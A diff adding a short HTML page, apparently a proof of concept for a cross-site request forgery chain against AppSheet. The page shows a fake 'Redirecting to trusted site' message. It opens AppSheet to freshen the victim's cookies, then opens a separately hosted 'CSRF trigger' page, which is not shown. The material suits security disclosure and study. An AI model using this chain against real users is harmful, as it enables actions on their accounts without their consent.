@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Chain Demo - Option A</title>
+  </head>
+  <body>
+    <h2>Redirecting to trusted site (AppSheet)...</h2>
+    <script>
+      // Step 1: Open trusted target (AppSheet) first to make cookies "recent"
+      window.open("https://www.appsheet.com/", "_blank");
+
+      // Step 2: After 3 seconds, open CSRF trigger in new tab
+      setTimeout(() => {
+        window.open("https://dishant550.github.io/poc/trigger.html", "_blank");
+      }, 3000);
+    </script>
+  </body>
+</html>
